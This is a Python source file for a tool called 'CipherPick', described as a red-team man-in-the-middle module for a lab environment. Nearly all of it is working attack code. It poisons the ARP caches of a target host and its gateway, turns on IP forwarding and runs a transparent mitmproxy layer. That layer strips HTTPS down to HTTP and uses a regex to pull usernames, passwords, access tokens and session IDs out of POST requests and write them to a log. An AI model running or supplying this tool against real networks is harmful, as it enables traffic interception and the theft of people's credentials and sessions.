"""
CipherPick - MITM Interception Module
Author: Senior Lead Cybersecurity Architect
Context: Red-Teaming & Security Auditing Framework (Controlled Lab Environment)

Dependencies:
    pip install scapy mitmproxy
"""

import os
import re
import sys
import time
import threading
import subprocess
import logging
from scapy.all import ARP, Ether, send, srp, conf
from mitmproxy import http
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options
import asyncio

# Configure Defensive Telemetry Logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [CipherPick MITM] - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("cipherpick_telemetry.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class NetworkRedirectionEngine:
    """
    Handles ARP Cache Poisoning and IP Forwarding for the MITM attack.
    """
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.running = False

    def get_mac(self, ip):
        """Resolves MAC address for a given IP."""
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=self.interface, verbose=False)
        if ans:
            return ans[0][1].src
        return None

    def enable_ip_forwarding(self):
        """Enables IP forwarding to avoid dropping the victim's connection (DoS prevention)."""
        logger.info("[*] Enabling IP forwarding...")
        if os.name == 'nt':
            # Windows
            subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"], capture_output=True)
        else:
            # Linux
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1\n")

    def disable_ip_forwarding(self):
        """Disables IP forwarding."""
        logger.info("[*] Disabling IP forwarding...")
        if os.name == 'nt':
            subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Disabled"], capture_output=True)
        else:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0\n")

    def poison(self):
        """Dual-target ARP poisoning."""
        target_arp = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        gateway_arp = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
        
        while self.running:
            send(target_arp, verbose=False)
            send(gateway_arp, verbose=False)
            time.sleep(2)

    def restore(self):
        """Restores the ARP cache of the targets."""
        logger.info("[*] Restoring ARP caches...")
        target_arp = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        gateway_arp = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
        
        send(target_arp, count=5, verbose=False)
        send(gateway_arp, count=5, verbose=False)

    def start(self):
        if not self.target_mac or not self.gateway_mac:
            logger.error("[!] Could not resolve MAC addresses. Exiting.")
            return

        self.enable_ip_forwarding()
        self.running = True
        self.thread = threading.Thread(target=self.poison, daemon=True)
        self.thread.start()
        logger.info(f"[*] ARP Poisoning started between {self.target_ip} and {self.gateway_ip}")

    def stop(self):
        self.running = False
        if hasattr(self, 'thread'):
            self.thread.join()
        self.restore()
        self.disable_ip_forwarding()


class TransparentProxyLayer:
    """
    mitmproxy addon to intercept HTTP/HTTPS traffic, perform SSL Stripping, 
    and dynamically extract credentials.
    """
    def __init__(self):
        self.creds_pattern = re.compile(
            r"(?i)(user(?:name)?|email|login|pass(?:word)?|access_token|session_id)=([^&]+)"
        )

    def request(self, flow: http.HTTPFlow):
        # 1. Security Research Use Case: SSL Stripping
        # Redirect HTTPS requests to HTTP in transit (for HSTS evaluation)
        if flow.request.scheme == "https":
            flow.request.scheme = "http"
            if flow.request.port == 443:
                flow.request.port = 80
            logger.info(f"[SSL Strip] Stripped HTTPS from request to {flow.request.host}")

        # 2. Dynamic Credential Extraction
        if flow.request.method == "POST" and flow.request.content:
            content = flow.request.get_text()
            matches = self.creds_pattern.findall(content)
            if matches:
                logger.warning(f"[CREDENTIAL EXTRACT] Found potential credentials on {flow.request.host}: {matches}")

    def response(self, flow: http.HTTPFlow):
        # 3. Defensive Telemetry: Monitor HSTS and HPKP headers
        hsts_header = flow.response.headers.get("Strict-Transport-Security", None)
        hpkp_header = flow.response.headers.get("Public-Key-Pins", None)

        if hsts_header:
            logger.info(f"[TELEMETRY] HSTS detected from {flow.request.host}: {hsts_header}")
        
        if hpkp_header:
            logger.info(f"[TELEMETRY] HPKP detected from {flow.request.host}: {hpkp_header}")


class CipherPickMITM:
    """
    Main orchestration class for the MITM module.
    """
    def __init__(self, target_ip, gateway_ip, interface="eth0", proxy_port=8080):
        self.arp_engine = NetworkRedirectionEngine(target_ip, gateway_ip, interface)
        self.proxy_port = proxy_port
        self.proxy_master = None

    def start_proxy(self):
        opts = Options(listen_host='0.0.0.0', listen_port=self.proxy_port, mode=["transparent"])
        self.proxy_master = DumpMaster(opts, with_termlog=False, with_dumper=False)
        self.proxy_master.addons.add(TransparentProxyLayer())
        
        logger.info(f"[*] Starting transparent proxy on port {self.proxy_port}...")
        
        def run_loop():
            asyncio.set_event_loop(asyncio.new_event_loop())
            self.proxy_master.run()

        self.proxy_thread = threading.Thread(target=run_loop, daemon=True)
        self.proxy_thread.start()

    def start(self):
        logger.info("=== CipherPick MITM Engine Initialization ===")
        self.arp_engine.start()
        self.start_proxy()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("[*] Shutting down CipherPick MITM Engine...")
            self.stop()

    def stop(self):
        if self.proxy_master:
            self.proxy_master.shutdown()
        self.arp_engine.stop()


if __name__ == "__main__":
    # Example Lab Environment Usage
    TARGET_IP = "192.168.1.100"  # Replace with lab target IP
    GATEWAY_IP = "192.168.1.1"   # Replace with lab gateway IP
    INTERFACE = "eth0"           # Replace with active interface

    mitm_module = CipherPickMITM(TARGET_IP, GATEWAY_IP, INTERFACE)
    mitm_module.start()
